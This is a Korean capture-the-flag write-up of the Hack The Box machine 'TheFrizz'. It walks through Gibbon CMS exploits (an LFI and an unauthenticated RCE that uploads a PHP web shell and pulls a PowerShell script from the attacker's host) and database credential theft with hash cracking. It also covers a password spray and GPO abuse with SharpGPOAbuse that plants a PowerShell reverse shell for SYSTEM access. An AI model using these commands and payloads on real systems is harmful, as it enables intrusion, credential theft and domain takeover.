# HTB-THEFRIZZ
```bash
OS: Windows(AD)
DATE: 26.10.26
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 정찰을 위해 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49232,49664,49667,49670,52230,52242 frizz.htb | tee nmap
```
그 결과 88, 389 등이 열려 있는 것으로 보아 AD DC 서버인 것을 알게 되었고, 상세 검사를 통해 도메인도 알게 되었다. 먼저 445 포트, 즉 SMB 서비스가 있으니 열거해 보았다.
```bash
nxc smb IP -u '' -p '' --shares
```
무슨 이유인지 **STATUS_NOT_SUPPORTED**라는 문구가 뜨며 동작하지 않았다. 따라서 80번 포트에 접속해 보았다. 접속 결과 **frizzdc.frizz.htb/home**이라는 서브도메인으로 리다이렉트되어, 똑같이 따라 접속해 보았다. 이후 웹 디렉터리 FUZZING을 진행하였다.
```bash
ffuf -u http://frizzdc.frizz.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -c
```
```bash
ffuf -u http://frizzdc.frizz.htb/home/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -c
```
FUZZING 결과 중요한 정보는 얻지 못하여 동적으로 탐색해 보았다. 탐색하던 중 로그인 창이 있어 접속해 본 결과, 이 서비스가 **GIBBON CMS**로 동작 중인 것을 알게 되었다.

## Initial Access
HTTP 서비스의 CMS를 알게 되어 대상 버전을 찾고 exploit을 검색해 보았다. 대상 버전이 25.0.0이라고 적혀 있어 검색해 본 결과 **CVE-2023-34598**이라는 취약점을 찾게 되었다. 대상 취약점은 LFI 취약점으로 중요 파일을 빼낼 수 있는 것을 알게 되어, PoC를 사용하여 여러 파일을 빼내 보았다.
```bash
python3 CVE-2023-34598/CVE-2023-34598.py scan http://frizzdc.frizz.htb/Gibbon-LMS/
[*] Scanning URL: http://frizzdc.frizz.htb/Gibbon-LMS
[+] Target appears vulnerable. Saving dump...
[+] Database dump saved to 'Gibbon_dump/gibbon.sql'.
```
하지만 정작 중요한 DB 파일 같은 것들은 dump하지 못하여 다른 취약점이 있는지 확인해 보았다. 더 검색해 본 결과 **CVE-2023-45878**이라는, unauthenticated RCE라는 더 강력한 취약점을 발견하게 되었다. 이것 또한 PoC를 사용하여 exploit을 진행해 보았다.
```bash
python3 CVE-2023-45878-POC/CVE-2023-45878.py --reverse-shell -target_url http://frizzdc.frizz.htb/Gibbon-LMS -ip IP -port 4444 -srvport 80

[+] PHP shell uploaded successfully to http://frizzdc.frizz.htb/Gibbon-LMS/shell.php
[+] PowerShell reverse shell script saved to: shell.ps1
[+] The shell is now hosted at shell.ps1
Starting reverse shell listener in background...
Starting netcat listener on port 4444...
[+] HTTP server running in the background on port 80
[+] Executing PHP shell to download and execute shell.ps1
Executing: http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=powershell%20-nop%20-w%20hidden%20-c%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.23%3A80/shell.ps1%27%29
[+] HTTP server started on http://0.0.0.0:80/
listening on [any] 4444 ...
10.129.232.168 - - [29/Oct/2026 12:03:25] "GET /shell.ps1 HTTP/1.1" 200 -
connect to [10.10.14.23] from (UNKNOWN) [10.129.232.168] 50304
whoami
frizz\w.webservice
PS C:\xampp\htdocs\Gibbon-LMS>
```
그 결과 w.webservice라는 낮은 권한 계정을 얻게 되었다. 따라서 권한 상승을 위해 얻은 쉘에서 열거해 본 결과, `C:\xampp\htdocs\Gibbon-LMS\config.php` 위치에 SQL에 접속할 수 있는 크레덴셜이 있었다.
```php
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```
따라서 mysql 명령어를 사용하여 접속하려고 했지만 mysql 도구가 없었다. mysqldump도 사용하려 했지만 역시 없었다. 알고 보니 xampp 폴더 안에 mysql 폴더가 있었고, 그 안에 mysql을 실행할 수 있는 mysql.exe 프로그램 파일이 있어서 그곳에서 실행이 가능하였다. 따라서 그 폴더에 들어가 알고 있는 자격증명으로 시도하였다.
```bash
C:\xampp\mysql\bin\mysql.exe -h localhost -u MrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon
```
이제 mysql에 접속하였지만 대화형 쉘은 불가능한 것 같았다. 따라서 -e 옵션을 사용하여 테이블 목록을 조회해 보았다.
```bash
C:\xampp\mysql\bin\mysql.exe -h localhost -u MrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e "SHOW TABLES;"

bonpayment                                                                                                                                                                                                      gibbonpermission                                                                                                                                                                                                   gibbonperson                                                                                                                                                                                                       gibbonpersonaldocument                                                                                                                                                                                             gibbonpersonaldocumenttype                                                                                                                                                                                         gibbonpersonmedical                                                                                                                                                                                                gibbonpersonmedicalcondition                                                                                                                                                                                       gibbonpersonmedicalconditionupdate                                                                                                                                                                                 gibbonpersonmedicalupdate                                                                                                                                                                                          gibbonpersonreset                                                                                                                                                                                                  gibbonpersonstatuslog                                                                                                                                                                                              gibbonpersonupdate                                                                                                                                                                                                 gibbonplannerentry                                                                                                                                                                                                 gibbonplannerentrydiscuss                                                                                                                                                                                          gibbonplannerentryguest                                                                                                                                                                                            gibbonplannerentryhomework                                                                                                                                                                                         gibbonplannerentryoutcome                                                                                                                                                                                          gibbonplannerentrystudenthomework                                                                                                                                                                                  gibbonplannerentrystudenttracker                                                                                                                                                                                   gibbonplannerparentweeklyemailsummary                                                                                                                                                                              gibbonreport                                                                                                                                                                                                       gibbonreportarchive     
```
많은 테이블이 나왔지만 `gibbonperson`이라는 테이블이 눈에 띄었다. 따라서 출력을 해보았다.
```bash
C:\xampp\mysql\bin\mysql.exe -h localhost -u MrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e "SELECT username,passwordStrong,passwordStrongSalt FROM gibbonperson;"

username        passwordStrong  passwordStrongSalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
```
조회 결과 f.frizzle 유저의 해시 처리된 password를 알게 되었고, 솔트도 있는 것을 알게 되었다. `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489` 문자가 무슨 해시인지 찾아보았다. 그 결과 sha256+salt인 것을 알게 되어 hashcat mode 1410을 돌려보았다.
```bash
hashcat -m 1420 hash -a 0 /usr/share/wordlists/rockyou.txt
```
하지만 결과가 나오지 않아 hashcat mode 1420, 즉 (salt+password)로 다시 한번 시도해 보았다.
```bash
hashcat -m 1420 hash -a 0 /usr/share/wordlists/rockyou.txt
```
그 결과 평문 비밀번호를 얻는 데 성공하였다. 따라서 nxc를 사용하여 smb 접속이 가능한지 확인해 보았다.
```bash
nxc smb IP -u f.frizzle -p PASS

SMB         10.129.232.168  445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         10.129.232.168  445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED
```
하지만 접속이 불가능하다고 떴다. 여기서 결과를 본 순간 무엇이 문제인지 알게 되었다. NTLM 파트가 False로 표시되어 있었다. NTLM은 AD에서 "너 누구냐"를 증명하는 방식이다. 하지만 옛날 방식이기 때문에 잘 사용하지 않는다. 따라서 요즘은 Kerberos 티켓 기반으로 인증을 한다. 이 머신은 NTLM 인증이 안 되는 것을 알게 되어, 시간 설정과 krb5.conf 파일을 먼저 nxc로 자동 생성해 주고 KDC 세팅을 해주었다.
```bash
nxc smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf
```
```bash
cp krb5.conf /etc/krb5.conf
```
이후 kinit을 이용하여 `f.frizzle` 유저의 TGT 티켓을 발급받았다.
```bash
kinit f.frizzle

klist          
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: f.frizzle@FRIZZ.HTB

Valid starting       Expires              Service principal
2026-10-29T20:54:14  2026-10-30T06:54:14  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 2026-10-30T20:54:10
```
그 결과 잘 받은 것을 확인하였다. 이후 ssh에 -k 옵션을 추가해 주고, kerberos 인증 방식이기 때문에 IP 대신 FQDN 이름을 사용하여 접속해 주었다.
```bash
ssh -k f.frizzle@frizzdc.frizz.htb
```
하지만 접속이 불가능하였다. 알고 보니 /etc/hosts에 도메인을 등록할 때 도메인 이름 frizz.htb을 먼저 적어 두어서, 리눅스가 서버의 대표 이름을 frizz.htb로 인식하고 있었다. kerberos는 정확한 컴퓨터 이름(SPN)으로 티켓을 요청하기 때문에, 존재하지 않는 host/frizz.htb 티켓을 요구하게 되어 인증이 실패한 것이다. FQDN을 맨 앞으로 수정하자 올바른 SPN으로 티켓을 요청하게 되어 정상 접속이 가능했다.
```bash
# /etc/hosts
IP  frizzdc.frizz.htb  frizz.htb

ssh -k f.frizzle@frizzdc.frizz.htb
```
그 결과 쉘에 접속할 수 있었고 user 플래그 또한 얻게 되었다.

![user](attach_real/Pasted%20image%2020261028011536.png)

## Privilege Escalation
쉘을 얻은 후 권한 상승 경로를 확인하기 위해 bloodhound를 확인해 주었다.
```bash
bloodhound-python -u f.frizzle -p 'Jenni_Luvs_Magic23' -d frizz.htb -ns IP -c all -k
```
하지만 중요한 정보는 얻지 못하였다. 따라서 쉘 안을 열거해 보았다. 그중 최하위 디렉터리에서 `dir -Force`, 즉 숨김 파일 및 폴더가 있는지 확인해 보았다.
```ps1
dir -Force

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           7/24/2025 12:41 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:41 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp
```
그중 `DumpStack.log.tmp` 파일을 확인해 보았지만 권한이 없었다. 따라서 **$RECYCLE.BIN**에 접속해 보았다. 다시 한번 `dir -Force`를 시도한 결과 **S-1-5-21-2386970044-1145388522-2932701813-1103**이라는 폴더가 있었고, 그 안에는 실제 파일 내용을 담고 있는 $R과 메타데이터를 나타내는 $I가 있었다. 따라서 내용물을 읽기 위해 $R로 시작하는 파일을 scp를 이용하여 로컬로 가져왔다. scp는 이미 kinit으로 인증해 놓았기 때문에 별다른 옵션이 필요 없었다.
```bash
scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' as.7z
```
이후 x 옵션으로 압축을 풀어 주었다.
```bash
7z x as.7z
```
압축 해제 결과 wapt라는 폴더가 풀렸고, 안에는 여러 폴더가 있었지만 conf 폴더가 눈에 띄어 들어가 보았다. 들어간 후 `waptserver.ini`라는 파일을 출력해 보았다.
```bash
cat waptserver.ini       
[options]
allow_unauthenticated_registration = True
wads_enable = True
login_on_wads = True
waptwua_enable = True
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
clients_signing_key = C:\wapt\conf\ca-192.168.120.158.pem
clients_signing_certificate = C:\wapt\conf\ca-192.168.120.158.crt

[tftpserver]
root_dir = c:\wapt\waptserver\repository\wads\pxe
log_path = c:\wapt\log
```
안에는 여러 키도 있었고 password도 있었다. 대상 패스워드는 base64로 인코딩되어 보여서 디코딩해 본 결과 어떤 패스워드가 나왔다. 따라서 도메인 유저 목록을 모두 저장해 주고 password spray를 진행한 결과 **M.SCHOOLBUS** 유저의 크레덴셜을 얻을 수 있었다.
따라서 새로운 쉘을 얻었기에 똑같이 kinit으로 TGT 티켓을 받아 주었다.
```bash
kinit m.schoolbus
```
```bash
klist

Ticket cache: FILE:/tmp/krb5cc_0
Default principal: m.schoolbus@FRIZZ.HTB

Valid starting       Expires              Service principal
2026-10-29T21:46:29  2026-10-30T07:46:29  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 2026-10-30T21:46:24
```
이후 bloodhound로 대상 유저의 outbound를 확인해 보았다.

![blod](attach_real/Pasted%20image%2020261029214836.png)

대상 유저는 도메인의 `Class_Frizz`라는 OU와 WriteGPLink 관계이기 때문에, 대상 OU에 있는 V_FRIZZLE가 도메인과 연결될 수 있도록 exploit하여 domain admin으로 권한 상승이 가능한 루트가 있었다. 이제 공격 루트가 생겼으니 공격을 준비하였다. 먼저 쉘에 SharpGPOAbuse 도구를 업로드해 주었다. [GPO 공격 루트](https://github.com/ReversecLabs/SharpGPOAbuse)
```bash
scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:/windows/temp/
```
이제 기존 GPO를 건들지 말고 새로 만들었다. 내가 소유자가 되니 마음대로 수정 가능하다.
```powershell
New-GPO -name "seon"
                                                                                                                      
DisplayName      : seon
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : f9221462-9493-49e2-90be-02fc8f5257f8
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 10/29/2026 7:04:57 AM
ModificationTime : 10/29/2026 7:04:57 AM
UserVersion      : 
ComputerVersion  : 
WmiFilter        : 
```
이후 도메인 루트에 링크를 해주었다.
```powershell
New-GPLink -Name "seon" -target "DC=frizz,DC=htb"
```
이러면 이 GPO가 도메인 전체에 적용된다. 이후 바로 리버스 쉘을 넣기 전에, 진짜 system으로 실행이 되는지 확인해 주었다.
```powershell
.\SharpGPOAbuse.exe --addcomputertask `
  --GPOName "seon" `
  --Author "seon" `
  --TaskName "RevShell" `
  --Command "powershell.exe" `
  --Arguments "whoami > \users\m.schoolbus\test"
```
이제 gpupdate로 적용을 시켜 주었다. GPO는 주기적으로 갱신되는데, 강제로 당기려면 이걸로 하면 된다.
```powershell
gpupdate /force
```
이제 type으로 test를 출력해 본 결과 system으로 나왔다. 이제 진짜 쉘을 따기 위해 새 GPO를 하나 더 만들어 주었다. 깨끗한 GPO로 하는 게 좋기 때문이다.
```powershell
New-GPO -name "seon-rev"
```
```powershell
New-GPLink -name "seon-rev" -target "DC=frizz,DC=htb"
```
이제 리버스 쉘 명령을 주입해 주었다.
```bash
echo -n "$client = New-Object System.Net.Sockets.TCPClient("IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" | iconv -t UTF-16LE | base64 -w 0
```
```powershell
.\SharpGPOAbuse.exe --addcomputertask `
  --GPOName "seon-rev" --Author "seon0rev" --TaskName "RevShell" `
  --Command "powershell.exe" `
  --Arguments "powershell -e <base64_리버스셸>"
```
```powershell
gpupdate /force
```
이제 공격 머신에서 리스너를 켜 놓으니 system 쉘이 들어왔다. 따라서 root 플래그를 얻을 수 있었다.

![root](attach_real/Pasted%20image%2020261029232242.png)

## New Inform
- CMS뿐만 아니라, 대상 취약점 하나만 있다고 생각하지 말고 더 강한 취약점을 찾아보자
- 앞으로 도구가 없다고 포기하지 말고, PATH에 없는 건지 구분하자
- `XAMPP`란 올인원 패키지로, 그 안에 SQL 등이 들어 있을 수 있음. 제발 끝까지 열거하자
- MySQL에서 패스워드를 입력하는 -p 옵션은 바로 붙여서 작성하자. ex) -p"PASS"
- MSSQL의 -q는 MySQL에서는 -e 옵션
- salt가 없는 해시는 같은 단어면 항상 같은 출력이다. 그래서 salt를 사용한다. salt는 해싱 전에 비밀번호에 섞어 넣는 랜덤 문자열이다
- hash와 salt를 나눌 때는 hash:salt 형식으로 : 로 나눈다 <- hashcat version
- sha256+salt는 두 가지가 있다. (salt+hash) 또는 (hash+salt)로 만들어진 두 경우가 있다. 따라서 모르면 둘 다 hashcat으로 시도해 보자. 1410, 1420
- hash 적는 순서가 mode를 정하는 게 아니라, 해시를 생성할 때 방법에 따라 모드가 바뀌는 것이다
- hash가 있고 `/` 까지가 salt
- AD에서 NTLM 인증 방식은 옛날 방식이다. 클라이언트가 서버에 "로그인할래"라고 하면 서버가 랜덤값을 주고, 클라이언트가 자기 비밀번호 해시로 그걸 암호화해서 돌려주면 서버가 검증하는 단순한 인증 방식이다. 따라서 요즘은 Kerberos 티켓 기반으로 작동한다
- Kerberos는 티켓 기반 AD 인증 방식이다. 중앙에 KDC라는 인증 센터가 있고 AD에선 DC가 그 역할을 한다. 비밀번호를 매번 보내는 게 아니라 한 번 인증받고 **티켓**을 받아서 그걸로 여기저기 접속할 수 있다
- Kerberos 동작 흐름 -> AS-REP: 클라이언트 to KDC(DC), 즉 비밀번호로 증명하면 KDC가 TGT를 발급(신원 확인됨, 도장이 찍힌 팔찌) -> TGS-REP: 클라이언트 to KDC(DC), 이 TGT를 들고 왔다고 말하고 SMB 서비스 쓸 티켓을 달라고 하는 과정, 그러면 KDC가 티켓 발급 -> AP-REQ: 클라이언트 to 실제 서비스, 이 서비스 티켓으로 접속함. 핵심은 TGT를 받아야 신원 확인이 되고, 그걸로 각 서비스 티켓을 받을 수 있다는 것. 그래서 공격자도 이 순서를 그대로 따라 해야 함
- 그러면 칼리 리눅스에서는 어떻게 해야 하나. 1. **krb5.conf** - KDC가 어디 있는지 알려주기. 리눅스는 도메인의 KDC가 어딘지 모르기에 설정 파일로 알려줘야 한다. nxc --generate-krb5-file krb5.conf로 편하게 자동 생성한다. 이후 `/etc/krb5.conf`로 cp해 준 후 사용. 주의점: Realm(도메인)은 대문자로 써야 함(kerberos 규약). 2. **kinit** - TGT 받기. 비밀번호를 물어보면 유저의 비번을 입력해서 TGT를 받아 `/tmp/krb5cc_101`에 캐시됨. klist로 받은 티켓 확인. 3. **티켓으로 접속** - -k 플래그. 이제 nxc든 뭐든 비밀번호 말고 캐시된 티켓을 사용하라는 -k 옵션을 쓸 수 있음
- nxc에서 `-k = "kerberos 인증을 켜라"` NTLM 말고 kerb 인증하겠다는 뜻. 그럼 nxc가 알아서 TGT를 받고 확인. `--use-kcache = "이미 있는 티켓 캐시를 써라"` 비밀번호를 새로 받지 말고 이미 있는 티켓을 사용
- windows 도메인에서 `(name:frizzdc) (domain:frizz.htb)`, 여기서 domain은 이 머신이 속한 도메인, name은 이 컴퓨터 한 대의 이름(그 도메인 안에 있는 특정 머신). 그래서 이 둘을 합친 전체 이름, 즉 **FQDN**이 `frizzdc.frizz.htb`. 이 구분이 중요한 이유는 Kerberos가 이름으로 동작하기 때문이다. Kerberos는 IP가 아니라 이름을 기준으로 티켓을 만들기 때문에 SPN이 중요하다
- /etc/hosts에서 이름 to ip를 세팅하는 곳에서 대표 이름 frizz.htb을 먼저 적으면, 리눅스는 이 IP의 대표 이름을 frizz.htb으로 인식한다. 그래서 불가능하다. 따라서 frizzdc.frizz.htb을 먼저 적어 주면 SPN이 실제로 존재하는 서비스로 인식되기 때문에 KDC가 티켓을 발급하는 데 성공한다
- 앞으로 FQDN을 먼저 저장해 주자
- 항상 winrm, rdp 다 없으면 ssh다
- 항상 최하위, 즉 C:\에서도 숨김 파일이 있는지 없는지 확인해 주자
- 항상 RECYCLE BIN을 확인하자
- 윈도우 휴지통에서 $R과 $I는 확실하게 다르다. $R은 실제 내용물 데이터, $I는 메타데이터, 즉 Information(이게 원래 뭐였는지에 대한 정보). 따라서 실제 내용을 복원하려면 $R로 시작하는 파일을 다운로드하자
- GPO란 정책 배포 시스템. AD에서 여러 컴퓨터·유저에게 설정을 한 번에 강제로 뿌리는 규칙 묶음. GPO는 대상 컴퓨터에서 스크립트를 실행시키는 것도 할 수 있다. 즉 내가 GPO를 조종할 수 있으면 그 GPO가 걸린 컴퓨터에서 내가 원하는 코드를 SYSTEM 권한으로 실행할 수 있음
- OU란 컴퓨터·유저를 담는 폴더. AD에서 컴퓨터와 유저를 분류해 담는 폴더. GPO는 OU 단위로 연결된다. 이 OU에 GPO를 걸면 그 OU 안에 든 모든 컴퓨터·유저가 그 정책을 적용받음
- WriteGPLink란 GPO를 그 OU에 연결/해제할 수 있는 권한
- Contain이란 OU/도메인이 그 객체를 담고 있음
- GPO abuse : New-GPO -> 새 GPO 생성 -> New-GPLink -> sharp로 쉘 주입 -> gpupdate /force 업데이트